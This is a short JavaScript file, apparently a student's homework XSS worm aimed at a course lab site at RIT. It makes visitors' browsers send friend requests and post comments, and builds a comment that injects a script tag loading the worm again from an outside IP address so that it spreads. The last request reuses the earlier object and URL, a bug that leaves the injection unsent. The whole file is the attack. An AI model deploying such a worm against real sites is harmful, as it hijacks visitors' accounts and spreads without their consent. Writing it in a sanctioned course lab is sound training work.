alert('get kek\'d')
const add_friend_req = new XMLHttpRequest();
const add_friend_url = 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=76#';
add_friend_req.open("GET", add_friend_url);
add_friend_req.send();

const comment_confirm_req = new XMLHttpRequest();
const comment_confirm_url = "http://csec380-core.csec.rit.edu:86/add_comment.php?id=76&comment=HiThere!";
comment_confirm_req.open("POST", comment_confirm_url);
comment_confirm_req.send();

const script_comment = new XMLHttpRequest();
const script_comment_url = "http://csec380-core.csec.rit.edu:86/add_comment.php&comment=<script src=http://52.14.213.84/hw6_worm/xss_worm.js></script>";
comment_confirm_req.open("POST", comment_confirm_url);
comment_confirm_req.send();    
